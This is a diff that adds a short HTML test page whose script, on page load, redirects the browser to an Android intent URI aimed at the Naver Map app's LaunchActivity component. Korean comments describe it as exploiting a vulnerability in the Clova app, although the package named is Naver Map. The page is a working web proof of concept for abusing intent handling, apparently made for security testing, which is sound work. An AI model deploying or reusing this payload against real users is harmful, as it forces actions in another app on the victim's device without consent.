@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head><title>Test</title></head>
+<body>
+    <h1>Hellllooooo!!!</h1>
+    
+    <script>
+        // 페이지 로드와 동시에 클로바 앱의 취약점을 이용해 인텐트를 쏩니다.
+        window.onload = function() {
+            // LaunchActivity는 intent-filter가 많아서 resolveActivity를 통과할 가능성이 99%입니다.
+            location.href = "intent:#Intent;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.nhn.android.nmap;component=com.nhn.android.nmap/com.naver.map.LaunchActivity;end";
+        };
+    </script>
+</body>
+</html>
+
